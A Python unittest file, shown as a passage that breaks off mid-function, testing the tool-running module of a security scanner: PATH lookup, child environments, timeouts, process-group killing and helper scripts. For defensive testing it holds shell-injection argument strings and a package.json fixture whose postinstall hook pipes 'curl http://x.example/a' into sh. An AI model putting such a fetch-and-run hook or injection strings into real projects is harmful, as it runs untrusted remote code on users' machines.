"""Tests of transit/tools/__init__.py (WP-06): ``ToolLocator``, ``child_env``, ``run_process``, ``run_helper_script``, ``load_wrappers``
and the wrapper protocol types. Plain unittest, standard library only:

    python3 -I -m unittest discover -s tests/engine -p "test_tools.py"

Every child process is a real process (the interpreter running the tests, a ``/bin/sh`` stub of ``tests/engine/support.py``, or one of the
four real helper programs of the bash engine run on a tiny input): nothing here mocks the thing under test. The only mocks are the
``PATH`` of a private ``Config``, the module list of ``load_wrappers`` (fake wrapper modules are injected into ``sys.modules`` and a patched
``pkgutil.iter_modules``, so nothing is written to the package) and, for the helper timeout rule, ``run_process`` itself. A token-shaped
credential is never written contiguously in this file.
"""
from __future__ import annotations

import contextlib
import json
import os
import pkgutil
import shutil
import signal
import sys
import tempfile
import time
import types
import unittest
from pathlib import Path
from unittest import mock

ROOT = Path(__file__).resolve().parents[2]
sys.path.insert(0, str(ROOT))
from tests.engine import support  # noqa: E402
from transit import tools  # noqa: E402
from transit.tools import (DIRECTORY_TOOLS, FILE_TOOLS, HELPER_SCRIPTS, MAX_CAPTURE_BYTES, OFFLINE_CHILD_ENV, ProcessResult,  # noqa: E402
                           ToolInfo, ToolLocator, ToolOutcome, ToolRequest, ToolWrapper, WrapperSet, child_env, load_wrappers,
                           run_helper_script, run_process)

FIXTURES = ROOT / "tests" / "fixtures" / "rules"
PY = sys.executable


class Stop(BaseException):
    """Stands for the private signal exception of ``pipeline`` (a ``BaseException`` that is not ``SystemExit``)."""


def py(code: str, *args: str) -> "list[str]":
    """An argument list that runs ``code`` in the interpreter of the tests."""
    return [PY, "-c", code, *args]


def alive(pid: int) -> bool:
    """True if the process exists and is not a zombie (a container's init may not reap an orphan at once)."""
    try:
        text = Path("/proc/%d/stat" % pid).read_text()
    except OSError:
        return False
    return text.rpartition(")")[2].split()[0] != "Z"


def wait_dead(pid: int, seconds: float = 5.0) -> bool:
    end = time.monotonic() + seconds
    while time.monotonic() < end:
        if not alive(pid):
            return True
        time.sleep(0.05)
    return not alive(pid)


def tmpdir(test: unittest.TestCase) -> str:
    path = os.path.realpath(tempfile.mkdtemp(prefix="transit-test-tools-"))
    test.addCleanup(shutil.rmtree, path, True)
    return path


def make_executable(directory: str, name: str, body: str = "exit 0") -> str:
    path = os.path.join(directory, name)
    with open(path, "w", encoding="utf-8") as handle:
        handle.write("#!/bin/sh\n" + body + "\n")
    os.chmod(path, 0o755)
    return path


# ═══════════════════════════════════════════════════════════════════════════════════════════════
class ConstantsTests(unittest.TestCase):
    """The frozen tables other packages rely on."""

    def test_the_offline_child_environment_is_the_four_variables_of_contract_2(self) -> None:
        self.assertEqual(dict(OFFLINE_CHILD_ENV), {"SEMGREP_SEND_METRICS": "off", "DO_NOT_TRACK": "1", "CHECKPOINT_DISABLE": "1",
                                                    "PIP_NO_INDEX": "1"})

    def test_the_helper_table_names_exactly_the_four_programs_that_are_run(self) -> None:
        self.assertEqual(dict(HELPER_SCRIPTS), {"office": "containers/office.py", "jar": "containers/jar.py", "pdf": "containers/pdf.py",
                                                "manifests": "scanners/manifests.py"})
        for relative in HELPER_SCRIPTS.values():
            self.assertTrue((ROOT / "transit" / relative).is_file(), relative)

    def test_every_tool_table_row_names_a_plain_executable(self) -> None:
        for table in (DIRECTORY_TOOLS, FILE_TOOLS):
            for key, binary in table.items():
                self.assertTrue(key and binary and "/" not in binary, (key, binary))
        self.assertEqual(set(DIRECTORY_TOOLS), {"gitleaks", "detect-secrets", "clamscan", "yara", "semgrep", "trivy", "scancode"})
        self.assertEqual(set(FILE_TOOLS), {"bandit", "shellcheck", "cppcheck", "hadolint", "checkov", "semgrep-js", "file", "strings", "unzip"})
        self.assertEqual(FILE_TOOLS["semgrep-js"], "semgrep")

    def test_the_capture_bound_is_64_mib(self) -> None:
        self.assertEqual(MAX_CAPTURE_BYTES, 64 * 1024 * 1024)


# ═══════════════════════════════════════════════════════════════════════════════════════════════
class ToolLocatorTests(unittest.TestCase):
    """``command -v`` with a cache, over the ``PATH`` of ``Config.environ``."""

    def locator(self, *path_dirs: str, **env: str) -> ToolLocator:
        return ToolLocator(support.make_config({"PATH": ":".join(path_dirs), **env}))

    def test_finds_an_executable_and_returns_an_absolute_path(self) -> None:
        d = tmpdir(self)
        make_executable(d, "bandit")
        info = self.locator(d).find("bandit")
        self.assertEqual(info, ToolInfo("bandit", os.path.join(d, "bandit")))
        self.assertTrue(os.path.isabs(info.path))

    def test_a_tool_that_is_not_there_is_none(self) -> None:
        d = tmpdir(self)
        self.assertIsNone(self.locator(d).find("bandit"))

    def test_a_file_without_the_execute_bit_is_not_a_tool(self) -> None:
        d = tmpdir(self)
        path = os.path.join(d, "bandit")
        Path(path).write_text("#!/bin/sh\n")
        os.chmod(path, 0o644)
        self.assertIsNone(self.locator(d).find("bandit"))

    def test_a_directory_with_the_name_is_not_a_tool(self) -> None:
        d = tmpdir(self)
        os.mkdir(os.path.join(d, "bandit"))
        self.assertIsNone(self.locator(d).find("bandit"))

    def test_the_search_goes_on_after_a_directory_without_the_tool(self) -> None:
        first, second = tmpdir(self), tmpdir(self)
        Path(first, "bandit").write_text("not executable")            # shadows nothing: command -v skips what it cannot run
        make_executable(second, "bandit")
        self.assertEqual(self.locator(first, second).find("bandit").path, os.path.join(second, "bandit"))

    def test_the_first_path_directory_wins(self) -> None:
        first, second = tmpdir(self), tmpdir(self)
        make_executable(first, "bandit")
        make_executable(second, "bandit")
        self.assertEqual(self.locator(first, second).find("bandit").path, os.path.join(first, "bandit"))

    def test_a_symlink_to_an_executable_is_found(self) -> None:
        d, other = tmpdir(self), tmpdir(self)
        target = make_executable(other, "real")
        os.symlink(target, os.path.join(d, "bandit"))
        self.assertEqual(self.locator(d).find("bandit").path, os.path.join(d, "bandit"))

    def test_the_path_of_the_config_is_used_and_not_the_one_of_the_process(self) -> None:
        d = tmpdir(self)                                                 # empty: "sh" is on the process PATH, not on this one
        self.assertIsNotNone(shutil.which("sh"))
        self.assertIsNone(self.locator(d).find("sh"))
        with mock.patch.dict(os.environ, {"PATH": d}):
            make_executable(d, "onlyhere")
            self.assertIsNone(ToolLocator(support.make_config({"PATH": "/nonexistent-dir"})).find("onlyhere"))

    def test_no_path_in_the_environment_finds_nothing(self) -> None:
        cfg = support.make_config()
        self.assertNotIn("PATH", cfg.environ)
        self.assertIsNone(ToolLocator(cfg).find("sh"))

    def test_an_empty_or_relative_path_component_is_not_searched(self) -> None:
        d = tmpdir(self)
        make_executable(d, "bandit")
        old = os.getcwd()
        self.addCleanup(os.chdir, old)
        os.chdir(d)                                                      # "." and "" would find ./bandit
        for path in ("", ":", ".", ":.:", "./", "sub:"):
            self.assertIsNone(ToolLocator(support.make_config({"PATH": path})).find("bandit"), path)
        os.mkdir(os.path.join(d, "sub"))
        make_executable(os.path.join(d, "sub"), "bandit")
        self.assertIsNone(ToolLocator(support.make_config({"PATH": "sub"})).find("bandit"))

    def test_the_answer_is_cached_for_a_hit_and_for_a_miss(self) -> None:
        d = tmpdir(self)
        locator = self.locator(d)
        self.assertIsNone(locator.find("bandit"))
        make_executable(d, "bandit")
        self.assertIsNone(locator.find("bandit"))                        # the miss is remembered
        make_executable(d, "shellcheck")
        info = locator.find("shellcheck")
        os.unlink(os.path.join(d, "shellcheck"))
        self.assertEqual(locator.find("shellcheck"), info)               # the hit is remembered
        self.assertIs(locator.find("shellcheck"), info)

    def test_a_name_with_a_path_separator_or_nothing_is_refused(self) -> None:
        locator = self.locator(tmpdir(self))
        for bad in ("", "a/b", "/usr/bin/sh", "../sh", "sh/", "a\0b", "."):
            with self.assertRaises(ValueError, msg=repr(bad)):
                locator.find(bad)

    def test_every_executable_name_of_the_tool_tables_can_be_asked(self) -> None:
        d = tmpdir(self)
        for binary in set(DIRECTORY_TOOLS.values()) | set(FILE_TOOLS.values()):
            make_executable(d, binary)
        locator = self.locator(d)
        for binary in set(DIRECTORY_TOOLS.values()) | set(FILE_TOOLS.values()):
            self.assertEqual(locator.find(binary).path, os.path.join(d, binary))


# ═══════════════════════════════════════════════════════════════════════════════════════════════
class ChildEnvTests(unittest.TestCase):
    def cfg(self, **env: str):
        return support.make_config({"PATH": "/usr/bin", "HOME": "/home/x", **env})

    def test_is_the_environment_plus_the_offline_variables_and_the_c_locale(self) -> None:
        env = child_env(self.cfg())
        self.assertEqual(env["PATH"], "/usr/bin")
        self.assertEqual(env["HOME"], "/home/x")
        for name, value in OFFLINE_CHILD_ENV.items():
            self.assertEqual(env[name], value)
        self.assertEqual(env["LC_ALL"], "C")                              # the hardened script exports LC_ALL=C for the whole run

    def test_the_offline_variables_win_over_the_environment(self) -> None:
        env = child_env(self.cfg(PIP_NO_INDEX="0", DO_NOT_TRACK="0", LC_ALL="en_US.UTF-8"))
        self.assertEqual((env["PIP_NO_INDEX"], env["DO_NOT_TRACK"], env["LC_ALL"]), ("1", "1", "C"))

    def test_extra_is_added_and_overrides(self) -> None:
        env = child_env(self.cfg(), extra={"JAR_MAX_ENTRIES": "7", "PIP_NO_INDEX": "x", "LC_ALL": "C.UTF-8"})
        self.assertEqual((env["JAR_MAX_ENTRIES"], env["PIP_NO_INDEX"], env["LC_ALL"]), ("7", "x", "C.UTF-8"))

    def test_remove_drops_the_names_even_if_extra_adds_them(self) -> None:
        env = child_env(self.cfg(GITLEAKS_CONFIG="/evil.toml", GITLEAKS_CONFIG_TOML="x = 1"),
                        remove=("GITLEAKS_CONFIG", "GITLEAKS_CONFIG_TOML", "NOT_THERE"), extra={"GITLEAKS_CONFIG": "again"})
        self.assertNotIn("GITLEAKS_CONFIG", env)
        self.assertNotIn("GITLEAKS_CONFIG_TOML", env)
        self.assertEqual(env["HOME"], "/home/x")

    def test_each_call_is_a_fresh_dict_and_nothing_else_is_touched(self) -> None:
        cfg = self.cfg()
        before_process = dict(os.environ)
        before_config = dict(cfg.environ)
        first = child_env(cfg)
        first["HOME"] = "changed"
        first["NEW"] = "1"
        second = child_env(cfg)
        self.assertIsNot(first, second)
        self.assertEqual(second["HOME"], "/home/x")
        self.assertNotIn("NEW", second)
        self.assertEqual(dict(cfg.environ), before_config)
        self.assertEqual(dict(os.environ), before_process)               # os.environ is never touched (S6)


# ═══════════════════════════════════════════════════════════════════════════════════════════════
class RunProcessTests(unittest.TestCase):
    def run_py(self, code: str, *args: str, **kwargs):
        kwargs.setdefault("env", {})
        kwargs.setdefault("timeout_s", 30)
        return run_process(py(code, *args), **kwargs)

    # -- the plain outcomes
    def test_an_ordinary_exit_gives_status_output_and_code(self) -> None:
        result = self.run_py("import sys; sys.stdout.write('out'); sys.stderr.write('err'); sys.exit(3)")
        self.assertEqual((result.status, result.returncode, result.stdout, result.stderr, result.truncated),
                         ("ok", 3, b"out", b"err", False))
        self.assertIsInstance(result, ProcessResult)
        self.assertGreaterEqual(result.elapsed_s, 0.0)
        self.assertLess(result.elapsed_s, 20.0)

    def test_exit_zero_and_binary_output_come_back_as_bytes(self) -> None:
        result = self.run_py("import sys; sys.stdout.buffer.write(bytes(range(256)))")
        self.assertEqual((result.status, result.returncode, result.stdout), ("ok", 0, bytes(range(256))))

    def test_a_signal_death_is_status_signal_with_a_negative_code(self) -> None:
        result = self.run_py("import os, signal; os.kill(os.getpid(), signal.SIGKILL)")
        self.assertEqual((result.status, result.returncode), ("signal", -signal.SIGKILL))

    def test_a_program_that_does_not_exist_is_not_found_and_nothing_raises(self) -> None:
        result = run_process(["/nonexistent/dir/tool", "x"], env={}, timeout_s=5)
        self.assertEqual((result.status, result.returncode, result.stdout, result.stderr), ("not_found", None, b"", b""))

    def test_a_name_that_is_not_on_the_path_of_the_given_environment_is_not_found(self) -> None:
        d = tmpdir(self)
        result = run_process(["sh", "-c", "exit 0"], env={"PATH": d}, timeout_s=5)             # the host has sh; this PATH does not
        self.assertEqual(result.status, "not_found")

    def test_a_program_that_cannot_be_started_is_error(self) -> None:
        d = tmpdir(self)
        path = os.path.join(d, "plain")
        Path(path).write_text("#!/bin/sh\nexit 0\n")
        os.chmod(path, 0o644)
        for argv in ([path], [d], ["a\0b"]):
            result = run_process(argv, env={}, timeout_s=5)
            self.assertEqual((result.status, result.returncode), ("error", None), argv)

    def test_an_empty_argument_list_is_a_programming_error(self) -> None:
        for argv in ([], ()):
            with self.assertRaises(ValueError):
                run_process(argv, env={}, timeout_s=5)

    # -- S6: no shell
    def test_no_shell_ever_sees_an_argument(self) -> None:
        d = tmpdir(self)
        marker = os.path.join(d, "MARK")
        hostile = ["$(touch %s)" % marker, "`touch %s`" % marker, "a;touch %s" % marker, "a|touch %s" % marker, "a&&touch %s" % marker,
                   "a\ntouch %s" % marker, "a b", "*", "~", "$HOME", "${PATH}", "-n", "--", "'", '"', "\\", "x\x1b[31mred", "", " "]
        result = self.run_py("import json, sys; json.dump(sys.argv[1:], sys.stdout)", *hostile)
        self.assertEqual(result.status, "ok")
        self.assertEqual(json.loads(result.stdout), hostile)             # every argument arrived exactly as given
        self.assertFalse(os.path.exists(marker))
        self.assertEqual(os.listdir(d), [])

    def test_an_argument_that_is_not_utf8_arrives_as_its_bytes(self) -> None:
        raw = b"bad\xff\xfe name"
        result = self.run_py("import os, sys; sys.stdout.write(os.fsencode(sys.argv[1]).hex())", os.fsdecode(raw))
        self.assertEqual(result.stdout, raw.hex().encode())

    def test_a_program_name_with_shell_syntax_is_one_file_name(self) -> None:
        d = tmpdir(self)
        marker = os.path.join(d, "MARK")
        result = run_process(["touch %s; true" % marker], env={"PATH": "/usr/bin:/bin"}, timeout_s=5)
        self.assertEqual(result.status, "not_found")
        self.assertFalse(os.path.exists(marker))

    # -- the environment, the directory, the session, standard input
    def test_the_child_gets_exactly_the_given_environment(self) -> None:
        with mock.patch.dict(os.environ, {"TRANSIT_TEST_LEAK": "from-the-parent"}):
            result = self.run_py("import json, os; json.dump({k: v for k, v in os.environ.items() if k.startswith(('TRANSIT_', 'MY_'))}, "
                                 "__import__('sys').stdout)", env={"MY_VAR": "mine", "LC_ALL": "C"})
        self.assertEqual(json.loads(result.stdout), {"MY_VAR": "mine"})

    def test_the_working_directory_is_the_one_given_else_the_current_one(self) -> None:
        d = tmpdir(self)
        result = self.run_py("import os; print(os.getcwd())", cwd=d)
        self.assertEqual(result.stdout.decode().strip(), d)
        result = self.run_py("import os; print(os.getcwd())")
        self.assertEqual(result.stdout.decode().strip(), os.path.realpath(os.getcwd()))

    def test_the_child_leads_a_new_session_and_process_group(self) -> None:
        result = self.run_py("import os; print(os.getsid(0), os.getpgid(0), os.getpid())")
        sid, pgid, pid = (int(x) for x in result.stdout.split())
        self.assertEqual(pgid, pid)
        self.assertEqual(sid, pid)
        self.assertNotEqual(sid, os.getsid(0))

    def test_standard_input_is_closed_unless_given(self) -> None:
        result = self.run_py("import sys; sys.stdout.buffer.write(b'[' + sys.stdin.buffer.read() + b']')", timeout_s=10)
        self.assertEqual((result.status, result.stdout), ("ok", b"[]"))      # EOF at once, not the terminal of the test run

    def test_the_standard_input_of_the_engine_is_never_inherited(self) -> None:
        read_end, write_end = os.pipe()
        os.write(write_end, b"the terminal of the operator")
        os.close(write_end)
        try:
            saved = os.dup(0)
        except OSError:
            saved = -1
        os.dup2(read_end, 0)
        os.close(read_end)
        try:
            result = self.run_py("import sys; sys.stdout.buffer.write(b'[' + sys.stdin.buffer.read() + b']')", timeout_s=10)
        finally:
            if saved >= 0:
                os.dup2(saved, 0)
                os.close(saved)
            else:
                os.close(0)
        self.assertEqual((result.status, result.stdout), ("ok", b"[]"))

    def test_standard_input_bytes_are_delivered(self) -> None:
        result = self.run_py("import sys; sys.stdout.buffer.write(sys.stdin.buffer.read().upper())", stdin=b"hello \x00 world")
        self.assertEqual(result.stdout, b"HELLO \x00 WORLD")

    def test_a_large_input_and_a_large_output_do_not_deadlock(self) -> None:
        blob = os.urandom(1 << 17) * 24                                  # 3 MiB through both pipes at once
        result = self.run_py("import sys; sys.stdout.buffer.write(sys.stdin.buffer.read())", stdin=blob, timeout_s=60)
        self.assertEqual((result.status, len(result.stdout), result.stdout == blob), ("ok", len(blob), True))

    def test_a_child_that_never_reads_its_input_is_not_a_hang(self) -> None:
        result = self.run_py("import sys; sys.stdout.write('done')", stdin=b"x" * (4 << 20), timeout_s=30)
        self.assertEqual((result.status, result.stdout), ("ok", b"done"))

    # -- the capture bound
    def test_output_beyond_the_bound_is_dropped_and_flagged_and_the_child_is_not_blocked(self) -> None:
        with mock.patch.object(tools, "MAX_CAPTURE_BYTES", 1000):
            result = self.run_py("import sys; sys.stdout.write('a' * 200000); sys.stderr.write('b' * 150000); sys.stdout.write('tail')")
        self.assertEqual((result.status, result.returncode), ("ok", 0))
        self.assertEqual((len(result.stdout), len(result.stderr)), (1000, 1000))
        self.assertEqual(result.stdout, b"a" * 1000)
        self.assertTrue(result.truncated)

    def test_output_that_just_fits_is_not_truncated(self) -> None:
        with mock.patch.object(tools, "MAX_CAPTURE_BYTES", 1000):
            result = self.run_py("import sys; sys.stdout.write('a' * 1000)")
            over = self.run_py("import sys; sys.stdout.write('a' * 1001)")
        self.assertEqual((len(result.stdout), result.truncated), (1000, False))
        self.assertEqual((len(over.stdout), over.truncated), (1000, True))

    # -- output to a file
    def test_output_file_receives_stdout_and_the_result_holds_none(self) -> None:
        d = tmpdir(self)
        path = os.path.join(d, "out.json")
        Path(path).write_text("old content that must not survive")
        result = self.run_py("import sys; sys.stdout.write('{\"results\": []}'); sys.stderr.write('warn')", output_file=path)
        self.assertEqual((result.status, result.returncode, result.stdout, result.stderr), ("ok", 0, b"", b"warn"))
        self.assertEqual(Path(path).read_bytes(), b'{"results": []}')

    def test_output_file_is_created_private_and_a_big_output_is_not_bounded_in_memory(self) -> None:
        d = tmpdir(self)
        path = os.path.join(d, "big")
        with mock.patch.object(tools, "MAX_CAPTURE_BYTES", 100):
            result = self.run_py("import sys; sys.stdout.write('x' * 100000)", output_file=path)
        self.assertEqual((result.status, result.truncated), ("ok", False))
        self.assertEqual(os.path.getsize(path), 100000)
        self.assertEqual(os.stat(path).st_mode & 0o777, 0o600)

    def test_an_output_file_that_cannot_be_opened_means_the_child_does_not_run(self) -> None:
        d = tmpdir(self)
        marker = os.path.join(d, "ran")
        result = self.run_py("open(%r, 'w').close()" % marker, output_file=os.path.join(d, "no", "such", "dir", "out"))
        self.assertEqual((result.status, result.returncode), ("error", None))
        self.assertFalse(os.path.exists(marker))

    def test_an_output_file_is_not_followed_through_a_symlink(self) -> None:
        d = tmpdir(self)
        victim = os.path.join(d, "victim")
        Path(victim).write_text("precious")
        link = os.path.join(d, "link")
        os.symlink(victim, link)
        result = self.run_py("print('overwritten')", output_file=link)
        self.assertEqual(result.status, "error")
        self.assertEqual(Path(victim).read_text(), "precious")

    # -- the timeout
    def test_a_child_that_outlives_its_timeout_is_killed(self) -> None:
        started = time.monotonic()
        result = self.run_py("import time; time.sleep(60)", timeout_s=0.5)
        self.assertEqual(result.status, "timeout")
        self.assertIsNone(result.returncode)
        self.assertLess(time.monotonic() - started, 20)
        self.assertGreaterEqual(result.elapsed_s, 0.4)

    def test_a_timeout_that_is_not_a_positive_number_is_an_immediate_timeout_never_an_unbounded_wait(self) -> None:
        for bad in (0, 0.0, -1, -1e9, float("nan"), None, "ten"):
            with self.subTest(timeout=bad):
                started = time.monotonic()
                result = self.run_py("import time; time.sleep(60)", timeout_s=bad)
                self.assertEqual(result.status, "timeout")
                self.assertLess(time.monotonic() - started, 20)

    def test_the_whole_process_group_dies_with_the_child(self) -> None:
        d = tmpdir(self)
        pidfile = os.path.join(d, "grandchild.pid")
        code = ("import os, subprocess, sys, time\n"
                "g = subprocess.Popen([sys.executable, '-c', 'import time; time.sleep(120)'])\n"
                "open(%r, 'w').write(str(g.pid))\n"
                "time.sleep(120)\n" % pidfile)
        result = self.run_py(code, timeout_s=1.5)
        self.assertEqual(result.status, "timeout")
        grandchild = int(Path(pidfile).read_text())
        self.addCleanup(lambda: alive(grandchild) and os.kill(grandchild, signal.SIGKILL))
        self.assertTrue(wait_dead(grandchild), "the grandchild survived the timeout")

    def test_a_child_that_ignores_sigterm_is_killed_all_the_same(self) -> None:
        result = self.run_py("import signal, time; signal.signal(signal.SIGTERM, signal.SIG_IGN); time.sleep(60)", timeout_s=0.5)
        self.assertEqual(result.status, "timeout")

    def test_a_descendant_that_keeps_the_pipe_open_after_the_child_left_is_a_timeout_and_is_killed(self) -> None:
        d = tmpdir(self)
        pidfile = os.path.join(d, "daemon.pid")
        code = ("import subprocess, sys\n"
                "g = subprocess.Popen([sys.executable, '-c', 'import time; time.sleep(120)'])\n"
                "open(%r, 'w').write(str(g.pid))\n" % pidfile)             # the child exits 0 at once; its descendant holds stdout
        started = time.monotonic()
        result = self.run_py(code, timeout_s=1.0)
        self.assertEqual(result.status, "timeout")
        self.assertLess(time.monotonic() - started, 20)
        daemon = int(Path(pidfile).read_text())
        self.addCleanup(lambda: alive(daemon) and os.kill(daemon, signal.SIGKILL))
        self.assertTrue(wait_dead(daemon))

    def test_what_was_captured_before_the_timeout_is_kept(self) -> None:
        result = self.run_py("import sys, time; sys.stdout.write('partial'); sys.stdout.flush(); time.sleep(60)", timeout_s=1.0)
        self.assertEqual((result.status, result.stdout), ("timeout", b"partial"))

    def test_a_base_exception_while_waiting_kills_the_group_and_propagates(self) -> None:
        d = tmpdir(self)
        pidfile = os.path.join(d, "child.pid")
        code = "import os, time\nopen(%r, 'w').write(str(os.getpid()))\ntime.sleep(120)\n" % pidfile

        def handler(signum, frame):
            raise Stop()

        old = signal.signal(signal.SIGALRM, handler)
        self.addCleanup(signal.signal, signal.SIGALRM, old)
        self.addCleanup(signal.setitimer, signal.ITIMER_REAL, 0)
        signal.setitimer(signal.ITIMER_REAL, 1.0)
        with self.assertRaises(Stop):
            run_process(py(code), env={}, timeout_s=60)
        signal.setitimer(signal.ITIMER_REAL, 0)
        child = int(Path(pidfile).read_text())
        self.addCleanup(lambda: alive(child) and os.kill(child, signal.SIGKILL))
        self.assertTrue(wait_dead(child), "the child was left running when the engine was interrupted")

    def test_the_timeout_is_enforced_for_a_child_that_floods_its_output(self) -> None:
        started = time.monotonic()
        with mock.patch.object(tools, "MAX_CAPTURE_BYTES", 100000):
            result = self.run_py("import sys\nwhile True:\n    sys.stdout.write('x' * 65536)", timeout_s=1.0)
        self.assertEqual(result.status, "timeout")
        self.assertLess(time.monotonic() - started, 20)
        self.assertEqual(len(result.stdout), 100000)
        self.assertTrue(result.truncated)


# ═══════════════════════════════════════════════════════════════════════════════════════════════
class RunHelperScriptTests(unittest.TestCase):
    """The four helper PROGRAMS of the bash engine, run as programs on a tiny input."""

    def cfg(self, **env: str):
        return support.make_config({"PATH": os.environ.get("PATH", ""), **env})

    def facts(self, result: ProcessResult) -> "list[str]":
        self.assertEqual(result.status, "ok", result)
        self.assertEqual(result.returncode, 0, result.stderr)
        return result.stdout.decode().splitlines()

    def test_unknown_helper_is_a_key_error(self) -> None:
        for name in ("gitleaks", "scancode", "report_json", "nope", ""):
            with self.assertRaises(KeyError):
                run_helper_script(name, [], cfg=self.cfg())

    def test_jar_runs_on_a_tiny_archive(self) -> None:
        d = tmpdir(self)
        result = run_helper_script("jar", [str(FIXTURES / "jar_native.jar"), os.path.join(d, "view.txt")], cfg=self.cfg())
        lines = self.facts(result)
        self.assertIn("FACT native_library 3 native/linux/libx.so; native/win/x.dll; native/mac/libx.dylib", lines)
        self.assertEqual(lines[-1], "FACT done")
        self.assertTrue(os.path.exists(os.path.join(d, "view.txt")))

    def test_office_runs_on_a_tiny_document(self) -> None:
        d = tmpdir(self)
        lines = self.facts(run_helper_script("office", [str(FIXTURES / "office_dde.docx"), os.path.join(d, "view.txt"), "docx"], cfg=self.cfg()))
        self.assertTrue(any(line.startswith("FACT dde 1 word/document.xml DDEAUTO") for line in lines), lines)
        self.assertEqual(lines[-1], "FACT done")

    def test_pdf_runs_and_writes_its_two_views(self) -> None:
        d = tmpdir(self)
        names, searchable = os.path.join(d, "names"), os.path.join(d, "searchable")
        result = run_helper_script("pdf", [str(FIXTURES / "benign_doc.pdf"), names, searchable], cfg=self.cfg())
        self.assertEqual((result.status, result.returncode), ("ok", 0), result.stderr)
        self.assertGreater(os.path.getsize(names), 100)
        self.assertGreater(os.path.getsize(searchable), 100)

    def test_the_pdf_helper_does_not_end_the_engine_even_though_importing_it_would(self) -> None:
        # transit/containers/pdf.py raises SystemExit(0) at import; as a program it is just a child that exits
        result = run_helper_script("pdf", [str(FIXTURES / "no_such.pdf"), "/dev/null", "/dev/null"], cfg=self.cfg())
        self.assertEqual(result.status, "ok")                            # a finished child with its own exit status, not an exit of the engine

    def test_manifests_runs_on_a_manifest(self) -> None:
        d = tmpdir(self)
        manifest = os.path.join(d, "package.json")
        Path(manifest).write_text(json.dumps({"name": "x", "scripts": {"postinstall": "curl http://x.example/a | sh"}}))
        self.assertEqual(self.facts(run_helper_script("manifests", [manifest], cfg=self.cfg())), ["FACT parsed", "FACT install_hook", "FACT hook_pipe"])

    def test_arguments_with_shell_syntax_are_arguments(self) -> None:
        d = tmpdir(self)
        old_cwd = os.getcwd()
        self.addCleanup(os.chdir, old_cwd)
        os.chdir(d)                                                      # a shell that ran ``touch MARK`` would create it here
        hostile = os.path.join(d, "$(touch MARK);`touch MARK2`.json")
        Path(hostile).write_text("{}")
        self.assertEqual(self.facts(run_helper_script("manifests", [hostile], cfg=self.cfg())), ["FACT parsed"])
        self.assertEqual(sorted(os.listdir(d)), [os.path.basename(hostile)])

    def test_the_knobs_of_the_configuration_reach_the_helper(self) -> None:
        d = tmpdir(self)
        args = [str(FIXTURES / "jar_native.jar"), os.path.join(d, "view.txt")]
        plain = self.facts(run_helper_script("jar", args, cfg=self.cfg()))
        limited = self.facts(run_helper_script("jar", args, cfg=self.cfg(JAR_MAX_ENTRIES="1")))
        self.assertNotEqual(plain, limited)
        self.assertTrue(any(line.startswith("FACT incomplete") for line in limited), limited)
        self.assertFalse(any(line.startswith("FACT incomplete") for line in plain), plain)

    def test_env_extra_reaches_the_helper_and_beats_the_configuration(self) -> None:
        d = tmpdir(self)
        args = [str(FIXTURES / "jar_native.jar"), os.path.join(d, "view.txt")]
        limited = self.facts(run_helper_script("jar", args, cfg=self.cfg(JAR_MAX_ENTRIES="100"), env_extra={"JAR_MAX_ENTRIES": "1"}))
        self.assertTrue(any(line.startswith("FACT incomplete") for line in limited), limited)

    def test_the_helper_is_started_as_an_isolated_program_with_the_child_environment(self) -> None:
        cfg = self.cfg(JAR_TIME_BUDGET_S="5")
        seen = {}

        def fake(argv, *, env, timeout_s, **kwargs):
            seen.update(argv=list(argv), env=dict(env), timeout_s=timeout_s, kwargs=kwargs)
            return ProcessResult("ok", 0, b"", b"", False, 0.0)

        with mock.patch.object(tools, "run_process", fake):
            run_helper_script("jar", ["/a/b.jar", "/tmp/v"], cfg=cfg, env_extra={"X": "1"})
        self.assertEqual(seen["argv"], [sys.executable, "-I", str(ROOT / "transit" / "containers" / "jar.py"), "/a/b.jar", "/tmp/v"])
        self.assertEqual(seen["env"], child_env(cfg, extra={"X": "1"}))
        self.assertEqual(seen["kwargs"], {})

    def test_the_default_timeout_covers_the_helper_budget_and_its_alarm_margin(self) -> None:
        def timeout_of(name: str, cfg, **kwargs) -> float:
            seen = {}

            def fake(argv, *, env, timeout_s, **kw):
                seen["t"] = timeout_s
                return ProcessResult("ok", 0, b"", b"", False, 0.0)

            with mock.patch.object(tools, "run_process", fake):
                run_helper_script(name, ["x", "y", "z"], cfg=cfg, **kwargs)
            return seen["t"]

        default = self.cfg()
        self.assertEqual(timeout_of("pdf", default), default.limits.helper_timeout_s)
        self.assertEqual(timeout_of("manifests", default), default.limits.helper_timeout_s)
        self.assertGreaterEqual(timeout_of("jar", default), 90 + 10)
        self.assertGreaterEqual(timeout_of("office", default), 90 + 10)
        self.assertGreaterEqual(timeout_of("jar", self.cfg(JAR_TIME_BUDGET_S="1000")), 1010)
        self.assertGreaterEqual(timeout_of("office", self.cfg(OFFICE_TIME_BUDGET_S="2000")), 2010)
        self.assertLess(timeout_of("jar", self.cfg(OFFICE_TIME_BUDGET_S="2000")), 2000)            # each helper reads its own knob
        self.assertEqual(timeout_of("pdf", self.cfg(TRANSIT_HELPER_TIMEOUT_S="42")), 42)
        self.assertEqual(timeout_of("jar", default, timeout_s=7.5), 7.5)                             # an explicit timeout is used as given

    def test_an_unreadable_manifest_is_a_fact_of_the_helper_and_not_a_failure_of_the_runner(self) -> None:
        d = tmpdir(self)
        result = run_helper_script("manifests", [os.path.join(d, "missing.json")], cfg=self.cfg(), timeout_s=60)
        self.assertEqual((result.status, result.returncode, result.stdout), ("ok", 0, b"FACT unparsed\n"))


# ═══════════════════════════════════════════════════════════════════════════════════════════════
class DirWrapper(ToolWrapper):
    """A whole-directory wrapper for the loader tests."""
    name = "gitleaks"
    binary = "gitleaks"
    layer = "L1_secrets_gitleaks"
    scope = "directory"
    missing_message = "gitleaks missing"
    missing_state = "skipped:gitleaks not installed"

    def run(self, request: ToolRequest) -> ToolOutcome:
        return ToolOutcome(layer_state="ran")


def wrapper_named(name: str) -> ToolWrapper:
    cls = type("W_" + name.replace("-", "_"), (DirWrapper,), {"name": name, "binary": (DIRECTORY_TOOLS.get(name) or FILE_TOOLS[name])})
    return cls()


class LoadWrappersTests(unittest.TestCase):
    """``load_wrappers`` over fake wrapper modules: ``pkgutil.iter_modules`` is patched and the modules sit in ``sys.modules``."""

    def install(self, modules: "dict[str, object]", extra_names: "tuple[str, ...]" = (), stack: "contextlib.ExitStack | None" = None):
        """``modules``: short name -> module object (or an exception class to raise on import). The patches end with the test, or with
        ``stack`` when one is given."""
        if stack is None:
            stack = contextlib.ExitStack()
            self.addCleanup(stack.close)
        names = list(modules) + list(extra_names)
